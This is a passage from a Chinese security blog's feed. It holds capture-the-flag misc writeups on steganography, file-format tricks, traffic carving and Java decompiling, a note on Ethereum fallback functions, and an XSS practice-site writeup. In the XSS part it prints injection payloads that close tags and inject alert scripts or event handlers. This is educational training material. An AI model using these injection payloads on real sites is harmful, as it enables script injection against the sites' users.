解码后才能得到 flag：</p><p><img src="/images/91-7.jpg" alt></p></li></ol></blockquote><h3 id="font-color-brown三-give-you-flagfont"><a class="markdownIt-Anchor" href="#font-color-brown三-give-you-flagfont"></a> <font color="brown">三、give you flag</font></h3><h4 id="font-color-navy1基础知识font-3"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font-3"></a> <font color="navy">1.基础知识</font></h4><blockquote><p><font color="orange">二维码的原理</font></p><ul><li><a href="http://blog.sae.sina.com.cn/archives/1139" target="_blank" rel="noopener">http://blog.sae.sina.com.cn/archives/1139</a></li><li><a href="https://blog.csdn.net/weiwei9363/article/details/81112795" target="_blank" rel="noopener">https://blog.csdn.net/weiwei9363/article/details/81112795</a></li><li><a href="https://blog.csdn.net/u012611878/article/details/53167009" target="_blank" rel="noopener">https://blog.csdn.net/u012611878/article/details/53167009</a></li></ul></blockquote><h4 id="font-color-navy2题目要求font-3"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font-3"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-8.jpg" alt></p><h4 id="font-color-navy3做题步骤font-3"><a class="markdownIt-Anchor" href="#font-color-navy3做题步骤font-3"></a> <font color="navy">3.做题步骤</font></h4><blockquote><ol><li><p>下载并打开附件，发现是一张格式为 gif 的图片，在图片最后会看到一个类似于二维码的图片，但是出现的时间太短了，无法截图</p><p><img src="/images/91-9.jpg" alt></p></li><li><p>那怎么办呢？一个字，“干”就完事了！写脚本，将这个 gif 动图一帧一帧的分离出来，说写咱就写！</p><p><img src="/images/91-10.jpg" alt></p></li><li><p>运行脚本就能得到 gif 每一帧的图片，其中红框标的的图片（名字为 49.jpg）的就是我们要得到的图片</p><p><img src="/images/91-11.jpg" alt></p></li><li><p>打开图片后，发现这并不是一个完整的二维码，那么这里就需要<font color="navy">“基础知识”</font>中所给连接的知识了。在查过相关资料后，发现得到的“残二维码”缺少三个定位图形，下面用 PS 将这三个定位图形加上，得到如下的图片：</p><p><img src="/images/91-12.png" alt></p></li><li><p>打开微信扫描二维码，得到 flag</p></li></ol></blockquote><h3 id="font-color-brown四-坚持-60-sfont"><a class="markdownIt-Anchor" href="#font-color-brown四-坚持-60-sfont"></a> <font color="brown">四、坚持 60 s</font></h3><h4 id="font-color-navy1基础知识font-4"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font-4"></a> <font color="navy">1.基础知识</font></h4><blockquote><p><strong>java 的逆向</strong>：JD — GUI</p></blockquote><h4 id="font-color-navy2题目要求font-4"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font-4"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-13.jpg" alt></p><h4 id="font-color-navy3做题步骤font-4"><a class="markdownIt-Anchor" href="#font-color-navy3做题步骤font-4"></a> <font color="navy">3.做题步骤</font></h4><blockquote><ol><li><p>下载附件，发现是一个 java 程序包，运行该程序（前提电脑要有 java 运行环境），如下图：</p><p><img src="/images/91-14.jpg" alt></p></li><li><p>开始玩这个游戏，发现自己怎么也坚持不住 60s，无奈只能对该程序进行逆向（我用的是 JD - GUI），在逆向的结果中搜索“flag”，发现在“PlaneGameFrame.class”中有该结果，于是打开该文件，得到如下结果：</p><p><img src="/images/91-15.jpg" alt></p></li><li><p>发现 flag 中的好像进行了 base64 加密，于是用 python 进行解密，如下：</p><p><img src="/images/91-16.jpg" alt></p></li><li><p>提交 flag ，回答正确。</p></li></ol></blockquote><h3 id="font-color-brown五-giffont"><a class="markdownIt-Anchor" href="#font-color-brown五-giffont"></a> <font color="brown">五、gif</font></h3><h4 id="font-color-navy1基础知识font-5"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font-5"></a> <font color="navy">1.基础知识</font></h4><blockquote><p><strong>python 的 <a href="https://www.runoob.com/python/os-file-methods.html" target="_blank" rel="noopener">os</a> 和 <a href="https://pillow.readthedocs.io/en/stable/" target="_blank" rel="noopener">Pillow</a> 模块</strong></p></blockquote><h4 id="font-color-navy2题目要求font-5"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font-5"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-17.jpg" alt></p><h4 id="font-color-navy3解题步骤font"><a class="markdownIt-Anchor" href="#font-color-navy3解题步骤font"></a> <font color="navy">3.解题步骤</font></h4><blockquote><ol><li><p>下载附件，解压压缩包，打开 gif 文件夹，发现该文件夹里面由下面一系列图片构成：</p><p><img src="/images/91-18.jpg" alt></p></li><li><p>这些图片代表什么意思呢？在分析了这些图片之后，得到大概的一个想法：这些图片是只由黑、白两种纯色构成，那么黑白的意思是不是代表 二进制中的1 和 0 呢？本着这个想法，我们开始想办法将这些图片用 1 和 0 代替。PS：因为图片太多，我想着用脚本来识别这些图片，再输出相应的数字，脚本如下：</p><p><img src="/images/91-19.jpg" alt></p></li><li><p>运行脚本，得到如下的结果：</p><p><img src="/images/91-20.jpg" alt></p></li></ol></blockquote><hr>2020-2-2 更新<h3 id="font-color-brown六-掀桌子font"><a class="markdownIt-Anchor" href="#font-color-brown六-掀桌子font"></a> <font color="brown">六、掀桌子</font></h3><h4 id="font-color-navy1基础知识font-6"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font-6"></a> <font color="navy">1.基础知识</font></h4><blockquote><p><strong>ASCII 值和字符的对应关系</strong></p></blockquote><h4 id="font-color-navy2题目要求font-6"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font-6"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-22.png" alt></p><h4 id="font-color-navy3解题步骤font-2"><a class="markdownIt-Anchor" href="#font-color-navy3解题步骤font-2"></a> <font color="navy">3.解题步骤</font></h4><blockquote><ol><li>打开题目，看到题目中给出一串字符串，但是这和掀桌子有什么关系呢？？？？？？？</li></ol><p>难道只是将这些字符转代表的 ASCII 值转换为对应的字符？？？？？</p><ol start="2"><li>下面查查这些字符有多少吧。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; len(<span class="string">"c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2"</span>)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>得到的答案是“118”，正好是偶数，那么两两字符的 ASCII 值正好对应一个字符，说干就干！！</p><ol start="3"><li><p>写出脚本，计算出两两字符的ASCII值，并转换为对应的字符：</p><p><img src="/images/91-23.jpg" alt></p></li><li><p>得到如下的结果：</p><p><img src="/images/91-24.jpg" alt></p></li><li><p>从上面的结果可以看到，得到的 ASCII 值均大于 128，那么我们再减去 128 的基础上，算出他们的字符，代码如下：</p><p><img src="/images/91-25.jpg" alt></p><p>执行修改过的代码，得到如下结果：</p><p><img src="/images/91-26.jpg" alt></p><p>从上图的红圈中可以看到“flag is”说明我们的思路没有错误，那么下面我们只需要提交 flag{hjzcydjzbjdcjkzkcugisdchjyjsbdfr} 即可</p></li></ol></blockquote><h3 id="font-color-brown七-simplerarfont隐写题"><a class="markdownIt-Anchor" href="#font-color-brown七-simplerarfont隐写题"></a> <font color="brown">七、SimpleRAR</font>（隐写题）</h3><h4 id="font-color-navy1基础知识font-7"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font-7"></a> <font color="navy">1.基础知识</font></h4><blockquote><p><strong>png 在 WinRAR 中的文件头格式</strong>：<a href="https://wenku.baidu.com/view/b7889b64783e0912a2162aa4.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/b7889b64783e0912a2162aa4.html</a></p></blockquote><h4 id="font-color-navy2题目要求font-7"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font-7"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-28.jpg" alt></p><h4 id="font-color-navy3解题步骤font-3"><a class="markdownIt-Anchor" href="#font-color-navy3解题步骤font-3"></a> <font color="navy">3.解题步骤</font></h4><blockquote><ol><li><p>下载附件，并解压附件，只得到一个 “flag.txt” 的文件，打开该文件文件，得到如下内容：</p><p><img src="/images/91-29.jpg" alt></p><p>从这个文件里面并没有得到实际的信息，那么下一步的思路是什么呢？</p></li><li><p>查了查相关的 writeup 才知道这个压缩包用 WinRAR 打开，修改一下数据：</p><p><img src="/images/91-27.jpg" alt></p><p>将上述蓝色阴影的 “A” 换成 “4”，然后保存，再将文件进行解压，得到如下的文件：</p><p><img src="/images/91-30.jpg" alt></p></li><li><p>用 WinRAR 打开 secret.png 图片，得到下面的信息：</p><p><img src="/images/91-31.jpg" alt></p><p>通过查阅资料，可以得到文件以“47 49 46 38 39 61”开头的图片格式是 gif 格式</p><p><img src="/images/91-32.jpg" alt></p></li><li><p>将文件后缀名改为 <strong>.gif</strong>，再打开文件但是没有什么反应，于是用 Photoshop 打开该文件，可以看出有两个图层：</p><p><img src="/images/91-33.jpg" alt></p></li><li><p>分别将这两个图层单独保存成两个 png 文件：1.png 和 2.png，再用 StegSolve 分别打开这两个图片，会得到两个图形，如下：</p><p><img src="/images/91-34.jpg" alt></p></li><li><p>将这两个图形合到一起，再增加一个定位图形，会得到一个完整的二维码：</p><p><img src="/images/91-35.png" alt></p></li></ol></blockquote><hr>2020-2-3 更新<h3 id="font-color-brown八-base64stegofont隐写题"><a class="markdownIt-Anchor" href="#font-color-brown八-base64stegofont隐写题"></a> <font color="brown">八、base64Stego</font>（隐写题）</h3><h4 id="font-color-navy1基础知识font-8"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font-8"></a> <font color="navy">1.基础知识</font></h4><blockquote><p><strong>base64 的隐写</strong>：</p><ul><li><a href="https://www.tr0y.wang/2017/06/14/Base64steg/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2017/06/14/Base64steg/index.html</a></li><li><a href="https://cltheorem.github.io/2018/10/base64%E9%9A%90%E5%86%99/" target="_blank" rel="noopener">https://cltheorem.github.io/2018/10/base64隐写/</a></li></ul><p><strong>python 的几个方法</strong>:</p><ul><li>zfill 方法</li><li>index 方法</li><li>readlines 方法</li><li>count 方法</li></ul></blockquote><h4 id="font-color-navy2题目要求font-8"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font-8"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-36.jpg" alt></p><h4 id="font-color-navy3解题步骤font-4"><a class="markdownIt-Anchor" href="#font-color-navy3解题步骤font-4"></a> <font color="navy">3.解题步骤</font></h4><blockquote><ol><li><p>下载并打开附件，发现好多行都是类似于 base64 编码后的数据，于是第一开始的思路是将这些数据 通过自己写的 base64 解码工具进行解码，脚本如下：</p><p><img src="/images/91-37.jpg" alt></p><p>运行脚本，得到如下的结果：</p><p><img src="/images/91-38.jpg" alt></p></li><li><p>通过分析得到的文本，并没有得到想要的 flag，但是得出这是一道隐写题：有关 base64 的隐写题，在查阅而资料后（第一部分的两个链接），写出了如下的脚本：</p><p><img src="/images/91-39.jpg" alt></p><p>运行脚本，得到 flag：</p><p><img src="/images/91-40.jpg" alt></p></li></ol></blockquote><hr>2020-2-4 更新<h3 id="font-color-brown九-ext3font"><a class="markdownIt-Anchor" href="#font-color-brown九-ext3font"></a> <font color="brown">九、ext3</font></h3><h4 id="font-color-navy1基础知识font-9"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font-9"></a> <font color="navy">1.基础知识</font></h4><blockquote><p><strong>文件系统的挂载</strong>：</p><p>相关链接：</p><ul><li><a href="https://zh.wikipedia.org/wiki/Mount_(Unix)" target="_blank" rel="noopener">mount 命令</a></li><li><a href="https://www.zhihu.com/question/266907637/answer/315386532" target="_blank" rel="noopener">能否通俗易懂，深入浅出地解释一下linux中的挂载的概念？</a></li><li><a href="https://blog.csdn.net/ljianhui/article/details/8604140" target="_blank" rel="noopener">初窥Linux 之 ext2/ext3文件系统</a></li></ul></blockquote><h4 id="font-color-navy2题目要求font-9"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font-9"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-41.jpg" alt></p><h4 id="font-color-navy3解题步骤font-5"><a class="markdownIt-Anchor" href="#font-color-navy3解题步骤font-5"></a> <font color="navy">3.解题步骤</font></h4><blockquote><ol><li><p>下载附件，并查看文件的类型：</p><p><img src="/images/91-42.jpg" alt></p><p>可以看出，这是一个 ext3 文件系统，那么我们应该想到系统挂载</p></li><li><p>这一步我们来将文件进行挂载</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;    mount 附件 temp</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ol></blockquote><blockquote><p>我们得到如下的文件：</p><p><img src="/images/91-43.jpg" alt></p><ol start="3"><li><p>这么多文件夹，哪个文件夹里面有 flag 呢？</p><p><img src="/images/91-44.jpg" alt></p><p>从红圈标的内容中可以看出，在 “O7avZhikgKgbF” 文件夹中有一个 flag.txt 文件</p></li><li><p>打开 flag.txt 文件，得到一个base64编码后的数据：“ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=”，进行base64解码，得到如下的结果：</p><p><img src="/images/91-45.jpg" alt></p></li></ol></blockquote><h3 id="font-color-brown十-steganofont"><a class="markdownIt-Anchor" href="#font-color-brown十-steganofont"></a> <font color="brown">十、stegano</font></h3><h4 id="font-color-navy1基础知识font-10"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font-10"></a> <font color="navy">1.基础知识</font></h4><blockquote><p><strong>摩斯密码</strong>的基础知识：</p><ul><li><a href="%5Bhttps://zh.wikipedia.org/wiki/%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81%5D(https://zh.wikipedia.org/wiki/%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81)">摩尔斯电码 wiki</a></li></ul><p><strong>PDF.js 技术</strong></p><ul><li><a href="http://blog.fpliu.com/it/web/front/library/PDF-js" target="_blank" rel="noopener">pdf.js 技术</a></li><li><a href="https://chrome.google.com/webstore/detail/pdf-viewer/oemmndcbldboiebfnladdacbdfmadadm/related" target="_blank" rel="noopener">pdf.js插件下载地址</a></li></ul><p><strong>其他的writeup</strong>：<a href="https://www.jianshu.com/p/f502793c13bb" target="_blank" rel="noopener">https://www.jianshu.com/p/f502793c13bb</a></p></blockquote><h4 id="font-color-navy2题目要求font-10"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font-10"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-46.png" alt></p><h4 id="font-color-navy3解题步骤font-6"><a class="markdownIt-Anchor" href="#font-color-navy3解题步骤font-6"></a> <font color="navy">3.解题步骤</font></h4><blockquote><ol><li><p>下载附件 “pdf” 文件，用软件打开以后并没有发现有用的信息，用 <font color="red"><strong>pdf.js</strong></font> 技术来打开 pdf 文件：在 console 中输入<code>document.documentElement.textContent</code> ，会得到如下的信息：</p><p><img src="/images/91-47.png" alt></p></li><li><p>将得到的信息复制下来，得到如下的内容：</p><p><img src="/images/91-48.png" alt></p><p>从上图中蓝色阴影由 “A” 和 “B” 组成的信息，再加上不同的间隔，可以看出这可能是摩尔斯密码</p></li><li><p>下面写出脚本，对这些信息进行解密，脚本如下：</p><p><img src="/images/91-49.png" alt></p></li><li><p>运行脚本，得到下面的结果：</p><p><img src="/images/91-50.png" alt></p></li></ol></blockquote><hr>2020-2-5 更新<h3 id="font-color-brown十一-功夫再高也怕菜刀font"><a class="markdownIt-Anchor" href="#font-color-brown十一-功夫再高也怕菜刀font"></a> <font color="brown">十一、功夫再高也怕菜刀</font></h3><h4 id="font-color-navy1基础知识font-11"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font-11"></a> <font color="navy">1.基础知识</font></h4><blockquote><ul><li><strong>jpg 图片的文件二进制格式</strong>：<a href="https://blog.csdn.net/STN_LCD/article/details/78629029" target="_blank" rel="noopener">https://blog.csdn.net/STN_LCD/article/details/78629029</a><ul><li>图片文件头格式总结：<a href="https://www.cnblogs.com/lwy-kitty/p/3928317.html" target="_blank" rel="noopener">https://www.cnblogs.com/lwy-kitty/p/3928317.html</a></li></ul></li><li><strong>wireshark 的使用</strong></li><li><strong>Winhex 的使用</strong></li></ul></blockquote><h4 id="font-color-navy2题目要求font-11"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font-11"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-51.png" alt></p><h4 id="font-color-navy3解题步骤font-7"><a class="markdownIt-Anchor" href="#font-color-navy3解题步骤font-7"></a> <font color="navy">3.解题步骤</font></h4><blockquote><ol><li><p>下载附件，发现附件是一个流量包，初猜那么这道题可能是一个流量包分析题，打开流量包，发现几乎都是 TCP 和 HTTP 组成，那么先尝试一下搜索一下 flag 关键词，看看是否有结果，搜索结果如下：</p><p><img src="/images/91-52.png" alt></p></li><li><p>追踪一下 flag.txt 文件的 TCP 流，看看传输的是什么数据：</p><p><img src="/images/91-53.png" alt></p><p>大略的看了一下这个流中的数据，发现结尾处是 jpg 图片的二进制结尾 “FFD9”，根据已有的经验找到 jpg 开头的 “FFD8” 格式：</p><p><img src="/images/91-54.jpg" alt></p></li><li><p>将十六进制的数据放到 “Winhex” 中，并保存格式为 “jpg” 的图片，如下图：</p><p><img src="/images/91-55.jpg" alt></p><p>将图片中的文字提交，发现提交的不对，说明这不是我们想求的 flag。</p></li><li><p>用 foremost 分离流量包，得到两个文件：audit.txt 和 zip 压缩包，打开 audit.txt 文件，得到如下信息：</p><p><img src="/images/91-56.png" alt></p></li><li><p>下一步解压压缩包，却发现需要解压密码，那么就想到了前面所得图片中的信息，输入之后进行解压，解压成功，得到 flag 文件：</p><p><img src="/images/91-57.png" alt></p></li></ol></blockquote><hr>2020-02-09 更新]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-pdffont&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-pdffont&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、PDF&lt;/font&gt;&lt;/h3&gt;
      
    
    </summary>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="misc" scheme="https://muzibing.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>以太坊智能合约漏洞 | Fallback函数</title>
    <link href="https://muzibing.github.io/2019/11/23/2019.11.23%EF%BC%8890%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/11/23/2019.11.23（90）/</id>
    <published>2019-11-22T16:00:00.000Z</published>
    <updated>2019-11-24T14:24:36.089Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-colorbrown一-fallback-函数介绍font"><a class="markdownIt-Anchor" href="#font-colorbrown一-fallback-函数介绍font"></a> <font color="brown">一、Fallback 函数介绍</font></h3><blockquote><p>合约可以有一个未命名的函数。这个函数<strong>不能有参数也不能有返回值</strong>，并且必须具有外部可见性。如果没有其他函数与给定的函数标识符匹配（或者根本没有提供任何数据），则在调用合同时执行该函数。</p><p><br>除此之外，每当合约收到以太币（没有任何数据），这个函数就会执行。此外，为了接收以太币并将其添加到合同的总余额中，<code>fallback</code> 函数必须标记为 <code>payable</code>。 如果不存在这样的函数，则合约不能通过常规交易接收以太币，并引发异常。</p><p><br>在这样的上下文中，通常只有很少的 gas 可以用来完成这个函数调用（准确地说，是 2300 gas），所以使 fallback 函数的调用尽量廉价很重要。 请注意，调用 fallback 函数的交易（而不是内部调用）所需的 gas 要高得多，因为每次交易都会额外收取 21000 gas 或更多的费用，用于签名检查等操作。</p><p><br>具体来说，以下操作会消耗比 fallback 函数更多的 gas：</p><ul><li>写入存储</li><li>创建合约</li><li>调用消耗大量 gas 的外部函数</li><li>发送以太币</li></ul><p><br>请确保您在部署合约之前彻底测试您的 fallback 函数，以确保执行成本低于 2300 个 gas。</p><p><br>除此之外，我们还可以这样理解 <code>fallback</code>  函数：</p><blockquote><p>If I have your wallet address, I can send you Ethers without your permission. In most cases, you might want to enable this ease-of-payment feature for your smart contracts too. This way, other contracts/wallets can send Ether to your contract, without having to know your ABI or specific function names.</p></blockquote></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-colorbrown一-fallback-函数介绍font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-colorbrown一-fallback-函数介绍font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;
      
    
    </summary>
    
    
      <category term="区块链" scheme="https://muzibing.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
      <category term="智能合约漏洞" scheme="https://muzibing.github.io/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>XSS Challenge（Stage1-4）writeup</title>
    <link href="https://muzibing.github.io/2019/11/19/2019.11.19%EF%BC%8889%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/11/19/2019.11.19（89）/</id>
    <published>2019-11-18T16:00:00.000Z</published>
    <updated>2019-11-19T12:25:28.815Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>题目链接：<a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">XSS Challenges（共19关）</a></p></blockquote><h3 id="font-colorbrownstage-1font"><a class="markdownIt-Anchor" href="#font-colorbrownstage-1font"></a> <font color="brown">Stage #1</font></h3><h4 id="font-colornavy1-题目font"><a class="markdownIt-Anchor" href="#font-colornavy1-题目font"></a> <font color="navy">① 题目</font></h4><p><img src="/images/89-1.png" alt></p><h4 id="font-colornavy2-相关知识点font"><a class="markdownIt-Anchor" href="#font-colornavy2-相关知识点font"></a> <font color="navy">② 相关知识点</font></h4><blockquote><ul><li>XSS 的类型</li></ul></blockquote><h4 id="font-colornavy3-解题步骤font"><a class="markdownIt-Anchor" href="#font-colornavy3-解题步骤font"></a> <font color="navy">③ 解题步骤</font></h4><blockquote><p>▣ 首先看一下是否存在 XSS 攻击</p><p><img src="/images/89-2.png" alt></p><p>⚁ 首次尝试填入信息：</p><p><img src="/images/89-3.png" alt></p><p>▣ 可以从上图中看出，我们写入的 <code>Hello World</code> 被放在了 <code>&lt;b&gt; &lt;/b&gt;</code> 标签中，我们可以在这个标签中进行 <code>xss</code> 攻击，脚本如下：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&lt;script&gt;alert(<span class="built_in">document</span>.domain)&lt;<span class="regexp">/script&gt; /</span><span class="regexp">/ 之所以用 document.domain 是因为题目中的提示</span></span><br></pre></td></tr></table></figure><blockquote><p>▣ 点击 <code>search</code> 之后，窗口会给我们弹出一个提示框，如下：</p><p><img src="/images/89-4.png" alt></p><p>这就代表着我们成功的对该网页进行了 <code>xss</code> 攻击，下面让我们看一下源码，看一下浏览器是怎么渲染我们的输入：</p><p><img src="/images/89-5.png" alt></p></blockquote><h3 id="font-colorbrownstage-2font"><a class="markdownIt-Anchor" href="#font-colorbrownstage-2font"></a> <font color="brown">Stage #2</font></h3><h4 id="font-colornavy1-题目font-2"><a class="markdownIt-Anchor" href="#font-colornavy1-题目font-2"></a> <font color="navy">① 题目</font></h4><p><img src="/images/89-6.png" alt></p><h4 id="font-colornavy2-相关知识点font-2"><a class="markdownIt-Anchor" href="#font-colornavy2-相关知识点font-2"></a> <font color="navy">② 相关知识点</font></h4><blockquote><ul><li>close the current tag and add SCRIPT tag…</li></ul></blockquote><h4 id="font-colornavy3-解题步骤font-2"><a class="markdownIt-Anchor" href="#font-colornavy3-解题步骤font-2"></a> <font color="navy">③ 解题步骤</font></h4><blockquote><p>▣ 初尝试：先输入数据，看看网页源码<br><img src="/images/89-7.png" alt></p><p>▣ 从上图可以看出，我们输入的 <code>Hello World</code> 赋值给了 <code>&lt;input&gt;</code> 标签的 <code>value</code> 值，那么我们根据提示和第一次的尝试，可以对 <code>value</code> 标签进行闭合，然后进行 <code>xss</code> 攻击，攻击脚本如下：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1: <span class="string">"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/89-8.png" alt></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2: <span class="string">" onclick/onmouseoover=alert(document.domain)&gt;//</span></span><br></pre></td></tr></table></figure><p><img src="/images/89-9,png" alt></p><blockquote><p>在这里简单的介绍一下 <code>onclick</code>、<code>onmousedown</code>、<code>onmouseup</code>、<code>onmouseout</code>、<code>onmouseenter</code>、<code>onmouseleave</code>  和  <code>onmouseover</code>  的功能：</p><ul><li><code>onclick</code> ：在鼠标左健点击弹起之后触发的事件，即一次完整的鼠标点击过程。过程完成瞬间触发函数</li><li><code>onmouseover</code> ：属性在鼠标指针移动到元素上时触发</li><li><code>onmousedown</code> ：事件会在鼠标按键被按下时发生</li><li><code>onmouseup</code> ：事件会在松开鼠标按键时触发</li><li><code>onmouseout</code> ：属性在鼠标指针移动到元素外时触发</li><li><code>onmouseenter</code> ：属性在鼠标指针移动到元素上时触发，onmouseover和onmouseenter唯一的区别是 onmouseenter 事件不支持冒泡</li><li><code>onmouseleave</code> ：性在鼠标指针移动到元素外时触发， onmouseout和onmouseleave唯一的区别是 onmouseleave 事件不支持冒泡 。</li></ul></blockquote><h3 id="font-colorbrownstage-3font"><a class="markdownIt-Anchor" href="#font-colorbrownstage-3font"></a> <font color="brown">Stage #3</font></h3><h4 id="font-colornavy1-题目font-3"><a class="markdownIt-Anchor" href="#font-colornavy1-题目font-3"></a> <font color="navy">① 题目</font></h4><p><img src="/images/89-10.png" alt></p><h4 id="font-colornavy2-相关知识点font-3"><a class="markdownIt-Anchor" href="#font-colornavy2-相关知识点font-3"></a> <font color="navy">② 相关知识点</font></h4><blockquote><ul><li>The input in text box is properly escaped.</li></ul></blockquote><h4 id="font-colornavy3-解题步骤font-3"><a class="markdownIt-Anchor" href="#font-colornavy3-解题步骤font-3"></a> <font color="navy">③ 解题步骤</font></h4><blockquote><p>▣ 初试 <code>Hello World</code> ：</p><p><img src="/images/89-11.png" alt></p><p>▣ 从上图可以看到，我们输入 <code>Hello World</code> 以后，网页显示了两个内容：</p><p>       <code>&lt;b&gt; &quot;Hellow World&quot; &lt;/b&gt;</code></p><p>       <code>&lt;b&gt; Japan &lt;/b&gt;</code></p><p>我们先尝试对第一处的进行标签闭合，如下图：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: <span class="string">"&lt;/b&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;b&gt;"</span></span><br></pre></td></tr></table></figure><blockquote><p><img src="/images/89-12.png" alt></p><p>▣ 我们从上图看到，我们的 payload 没有被执行，说明该处不能够进行 xss 攻击，那么我们尝试修改第二处的值，也就是 <code>Japan</code> 的值（这个的实现我们可以用 <code>burp</code> 工具进行）：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：<span class="string">"&lt;/b&gt;&lt;script&gt;alert(document.domain&gt;&lt;/script&gt;&lt;b&gt;"</span></span><br></pre></td></tr></table></figure><blockquote><p><img src="/images/89-13.png" alt></p><p>▣ 从下图的源码可以看到我们成功的执行了我们的脚本：</p><p><img src="/images/89-14.png" alt></p></blockquote><h3 id="font-colorbrownstage-4font"><a class="markdownIt-Anchor" href="#font-colorbrownstage-4font"></a> <font color="brown">Stage #4</font></h3><h4 id="font-colornavy1-题目font-4"><a class="markdownIt-Anchor" href="#font-colornavy1-题目font-4"></a> <font color="navy">① 题目</font></h4><p><img src="/images/89-15.png" alt></p><h4 id="font-colornavy2-相关知识点font-4"><a class="markdownIt-Anchor" href="#font-colornavy2-相关知识点font-4"></a> <font color="navy">② 相关知识点</font></h4><blockquote><ul><li>invisible input field</li></ul></blockquote><h4 id="font-colornavy3-解题步骤font-4"><a class="markdownIt-Anchor" href="#font-colornavy3-解题步骤font-4"></a> <font color="navy">③ 解题步骤</font></h4><blockquote><p>▣ 我们可以看出，这道题目和上一道题目没有太大的区别，我们再通过 <code>burp</code> 对 <code>&lt;b&gt;</code> 两处可能存在的 <code>xss</code> 攻击进行尝试构建我们的脚本：</p><p><img src="/images/89-16.png" alt></p><p>执行结果如下:</p><p><img src="/images/89-17.png" alt></p><p>▣ 我们在两处都写入了我们的脚本，但是都没有被执行，在用 <code>burp</code> 抓包的过程中，我们发现，这道题比上一道题多了一个 <code>Hack</code>，那么我们是不是可以通过这个来实现 <code>xss</code> 攻击呢？我们先看一下 <code>Hack</code> 在页面哪个位置，如下图：</p><p><img src="/images/89-18.png" alt></p><blockquote><p>☛ 在这里我们补充一个知识点：<code>input</code> 的 <code>type</code> 属性</p><p>          ● <code>button</code>：定义可点击按钮（多数情况下，用于通过 JavaScript 启动脚本）</p><p>          ● <code>checkbox</code>：定义复选框</p><p>          ● <code>file</code>：定义输入字段和 &quot;浏览&quot;按钮，供文件上传</p><p>          ● <code>hidden</code>：定义隐藏的输入字段</p><p>          ● <code>image</code>： 定义图像形式的提交按钮</p><p>          ● <code>password</code>：定义密码字段。该字段中的字符被掩码</p><p>          ● <code>radio</code>：定义单选按钮</p><p>          ● <code>reset</code>：定义重置按钮。重置按钮会清除表单中的所有数据</p><p>          ● <code>submit</code>：定义提交按钮。提交按钮会把表单数据发送到服务器</p><p>          ● 